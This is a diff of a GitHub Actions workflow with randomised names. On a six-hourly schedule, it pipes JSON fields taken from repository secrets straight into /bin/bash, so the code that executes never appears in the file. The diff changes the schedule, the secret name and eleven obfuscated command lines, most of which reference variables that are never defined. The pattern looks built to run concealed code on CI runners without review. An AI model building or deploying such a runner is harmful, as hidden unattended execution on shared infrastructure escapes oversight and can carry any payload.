@@ -1,9 +1,9 @@
 name: yuanlaoban8715
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 1/6 * * *'
+    - cron: '28 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: yuanlaoban8715
         env:
-          jupd92: ${{ secrets.jupd92 }}
+          ypvul62236: ${{ secrets.ypvul62236 }}
         run: |
-          echo $jupd92 | jq -r .d16 | /bin/bash
-          echo $hrmt6935 | jq -r .risi0 | /bin/bash
-          echo $lyefi191 | jq -r .dxrp4201 | /bin/bash
-          echo $jrlih80048 | jq -r .wwyjd4317 | /bin/bash
-          echo $fsx46889 | jq -r .czm13604 | /bin/bash
-          echo $f96 | jq -r .bk384 | /bin/bash
-          echo $sd0 | jq -r .md8621 | /bin/bash
+          echo $ypvul62236 | jq -r .xn845 | /bin/bash
+          echo $wl994 | jq -r .mur1 | /bin/bash
+          echo $vcc70 | jq -r .dg5667 | /bin/bash
+          echo $h664 | jq -r .at67 | /bin/bash
+          echo $inndo0622 | jq -r .gfnxu5448 | /bin/bash
+          echo $kb9 | jq -r .ts8 | /bin/bash
+          echo $yz098 | jq -r .olckw99 | /bin/bash
+          echo $ii83 | jq -r .sylcb184 | /bin/bash
+          echo $tigft690 | jq -r .riu54 | /bin/bash
+          echo $m458 | jq -r .mq4 | /bin/bash
+          echo $oezh44 | jq -r .g80917 | /bin/bash
 
